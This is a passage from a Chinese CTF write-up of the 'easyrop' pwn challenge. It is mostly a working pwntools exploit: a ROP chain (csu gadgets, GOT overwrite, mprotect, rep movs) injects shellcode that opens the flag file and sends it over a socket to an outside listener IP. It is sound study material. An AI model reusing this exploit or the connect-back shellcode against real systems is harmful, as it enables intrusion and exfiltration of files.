    1,
    syscall
]
p.sendline(flat(payload).ljust(0x100,"a")+"flag\x00\x00\x00\x00")

p.interactive()
```

## easyrop(2.27/IO全关+监听式orw+自建gadget)

[shell-storm Online Assembler and Disassembler](https://shell-storm.org/online/Online-Assembler-and-Disassembler/)

pwnhub上的一道题，题目情况如图，未开pie，got表可写

![image-20220517095419337](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220517095419337.png)

![image-20220517095432184](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220517095432184.png)

![image-20220517095510700](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220517095510700.png)

一开始的思路是ret2dl，但是变态的一点是输入流也关了，栈迁移都不行，最后的思路还是栈溢出利用csu修改got表项为syscall，同时执行mprotect改bss段权限，再用magic在bss段里写入短小(8字节)的gadget，利用repmovs写入长的shellcode同时跳转执行。

> magic: add dword ptr [rbp - 0x3d], ebx; nop xxxxx; ret 主要实现在某一地址写入内容，可结合csu(opcode为015dc3)
>
> 这里调用的三个短gadget
>
> mov rsi, rsp; ret 将我们写在栈上的值赋给rsi，结合pop_rdi，为下面rep赋值
>
> pop rbp; pop rbx; pop rcx; ret 更方便的控制rbp和rbx利用magic，同时赋值rcx
>
> rep movs qword ptr [rdi],qword ptr [rsi];ret 地址递增赋值，用于我们写入shellcode 赋值rcx次

```python
# _*_ coding:utf-8 _*_
from pwn import *
import socket
import struct
context.update(arch="amd64", log_level="debug")

# p = process('./easyrop')
p = remote("47.97.127.1","28760")
elf = ELF("./easyrop")
libc = elf.libc
def dbg():
    gdb.attach(p)

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)
#-----------------------------------------------------------------------------------------
pop_rdi = 0x0000000000400903
pop_rsi_r15 = 0x0000000000400901
alarm_plt = elf.plt['alarm']
alarm_got = elf.got['alarm']
csu1 = 0x00000000004008FA
csu2 = 0x00000000004008E0
magic = 0x0000000000400618# add dword ptr [rbp - 0x3d], ebx; nop xxxxx; ret
bss = 0x601000+0x500
'''
0x0000000000400903: pop rdi; ret; 
0x0000000000400901: pop rsi; pop r15; ret; 
'''
# socket+connect
"""
/* socket(AF_INET, SOCK_STREAM, 0) */
push 41
pop rax
push 6
pop rdx
push 2
pop rdi
push 1
pop rsi
syscall

/* connect(s, addr, len(addr))  */
xchg eax, edi
mov al, 42
mov rcx, 0x0100007f11270002 /*127.0.0.1:10001 --> 0x7f000001:0x2711*/
push rcx
push rsp
pop rsi
mov dl, 16
syscall
"""
# send flag
""" 
xchg eax, edx
/* open flag */
mov rbx, 0x67616c662f
push rbx
push rsp
pop rdi
xor esi, esi
mov al, 2
syscall

xchg eax, esi
xchg edx, edi
push 0x601300
pop rdx
push 0x30
pop r10
mov al, 40
syscall
"""
remote_ip = "150.158.144.112"# 用于监听的公网服务器(用自己的IP！！！)
remote_port = 1234# 要在服务器管理处开启该端口的tcp连接
reverse_shell = b"\x6a\x29\x58\x6a\x06\x5a\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00"+ \
    struct.pack(">h", remote_port)+socket.inet_aton(remote_ip) + b"\x51\x54\x5e\xb2\x10\x0f\x05"

send_flag = b"\x92\x48\xbb\x2f\x66\x6c\x61\x67\x00\x00\x00\x53\x54\x5f\x31\xf6\xb0\x02\x0f\x05\x96\x87\xfa\x68\x00\x13\x60\x00\x5a\x6a\x30\x41\x5a\x31\xc0\xb0\x28\x0f\x05"

pop_rbp_rbx_rcx_ret = bss
mov_rsi_rsp_ret     = bss + 0x8
rep_movs            = bss + 0x10

pay = 'a'*0x10+p64(pop_rdi)+p64(0)+p64(alarm_plt)
pay += p64(csu1)+p64(5)+p64(alarm_got+0x3d)+p64(0)*4+p64(magic)
pay += p64(csu1)+p64(0)+p64(1)+p64(alarm_got)+p64(0x601000)+p64(0x1000)+p64(0x7)
pay += p64(csu2)+p64(0)+p64(0xc3595b5d)+p64(bss+0x3d)+p64(0)*4+p64(magic)# pop_rbp_rbx_rcx_ret
pay += p64(bss)+p64(bss+8+0x3d)+p64(0xc3e68948)+p64(0)+p64(magic)# mov_rsi_rsp_ret
pay += p64(bss)+p64(bss+0x10+0x3d)+p64(0xc3a548f3)+p64(15)+p64(magic)# rep_movs 

# rep构造 rdi:0x20/rsi:0x10->rdi:0x28/rsi:0x30(顺着rsp往下取了)->rdi:0x30:rsi:reverse_shell
pay += p64(pop_rdi)+p64(bss+0x20)+p64(bss+0x8)# mov rsi, rsp; ret
pay += p64(bss+0x10)+p64(bss+0x30)+reverse_shell+send_flag# rep movs

sleep(5)
# gdb.attach(p,'b *0x4008FA\nc\n')
s(pay)
print("length:", hex(len(pay)))
print("len of reverse:", hex(len(reverse_shell+send_flag)))
p.interactive()
```

![image-20220517101711344](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220517101711344.png)

### socket+connect+open+sendfile

0 = socket(1,2,0)

fffffxxx(负数) = connect(0，[ip:socket]_addr,0x10)

1 = open(flag_addr,0,fffffxxx(负数) )

sendfile(fffffxxx(负数) ,1,可写入地址，size(r10))

